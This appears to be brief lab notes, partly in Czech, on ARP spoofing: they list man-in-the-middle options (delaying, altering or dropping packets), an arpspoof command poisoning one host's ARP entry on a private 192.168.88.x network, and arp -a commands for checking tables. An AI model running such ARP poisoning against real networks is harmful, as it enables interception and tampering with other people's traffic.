moznosti:
  delay
  zmena hodnot 
  neposlani nekterych paketu

# .250 is device where we wants to spof arp table 
# .252 arp record we want to rewrite with our mac address 
`arpspoof -i eno2 -t 192.168.88.250 192.168.88.252

linux:
`arp -a -i eno2`

windows:
`arp -a`
 
